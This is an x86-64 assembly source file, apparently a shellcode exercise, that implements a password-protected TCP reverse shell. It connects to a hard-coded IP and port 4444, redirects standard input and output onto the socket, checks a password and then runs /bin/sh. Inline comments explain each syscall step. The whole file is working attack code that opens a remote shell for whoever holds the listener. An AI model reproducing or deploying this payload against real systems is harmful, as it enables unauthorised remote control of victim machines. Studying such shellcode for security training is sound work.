;reg1reg1
;TCP reverse shell that spawns a shell after connecting
; to the listening service
;Should be able to connect to TCPBindshell
global _start
section .text
_start:
	
	;Resetting the registers
	xor rax,rax
	mov r8,rax
	mov rdi,rax
	mov rsi,rdi
	mov rdx,rdi
	mov rbx,rdx
	;Step1:
	;Create a socket
	;Syscall num 41
	;refer man socket for more info
	;Created sock is stored in rax
		
	
	mov al,41
	mov dil,2
	mov sil,1
	syscall

	mov rdi,rax
	
	;Step2:
	;Connect to the listening service
	;Tricky as we need to construct the socket addr struct
	;Connect binds socket to a remote address
	; man connect
	; connect (sock, struct sockaddr*)&server, sockaddr_len))
	;sock is already stored in rdi
	xor rax,rax
	push rax
	mov bl,0x2
	xor rcx,rcx
	mov ecx, 0x1fffffff
	sub ecx, 0x1EFFFF80
	mov dword [rsp-4],ecx; Ip address hex encoded network byte order
	mov word [rsp-6], 0x5c11 ;Port number in hex encoded network byte order
	mov word [rsp-8], bx
	sub rsp,8
	
	mov al,42
	mov rsi,rsp
	mov dl,16
	syscall
	
	

	;Step3:
	;Connect and replace file descriptors
	;syscall number for this is 33

	

	;Here we do not close the old socket	
	
	xor rax,rax
	mov rsi,rax

	mov al,33
	mov sil,2
	syscall
	
	mov al,33
	mov sil,1
	syscall

	mov al,33
	xor sil,sil 
	syscall
	
	xor rax,rax
	push rax	
	mov rax,0x7878787878787878
	push rax
	mov word [rsp-2],0x7878
	sub rsp,2
	mov rsi,rsp
	push 0x37333331
	mov byte [rsp-1],0x78
	sub rsp,1
	mov r10,rsp
	;Step4:
	;Read Input from User

	xor rax,rax
	mov rdi,rax
	mov dl,10
	syscall

	;Compare the 2 strings
	mov bl,6
	sub rbx,rax
	js exiting
	xor rcx,rcx
	mov cl,5
	mov rdi,r10
	rep cmpsb
	jz ExecCall

exiting:
	xor rax,rax
	mov rsi,rax
	mov al,60
	syscall

ExecCall:
	jmp l2

callShell:
	;Shellcalling
	;rdi must contain address of the file name
	;rsi must contain the address of the string , followeby null to signify no arguments apart from the string name)
	;rdx must contain 0'x
	pop rdi
	xor rax,rax
	;This is done to null terminate the program name (replace X with \0)
	mov [rdi+7], byte al ; add 7 to the value of rdi (which is nothing but stored address of str1) and treat this as a source address and move a byte 
	mov [rdi+8], rdi ; add 8 to the value of rdi (address of str1) and store the value of rdi (the address of str1) here
	mov [rdi+16],rax ; 
	lea rsi,[rdi+8]
	lea rdx,[rdi+16]
	mov al,59
	syscall
l2:
	call callShell ; Will push the address of the next instruction onto the stack
	str1: db "/bin/shX"	
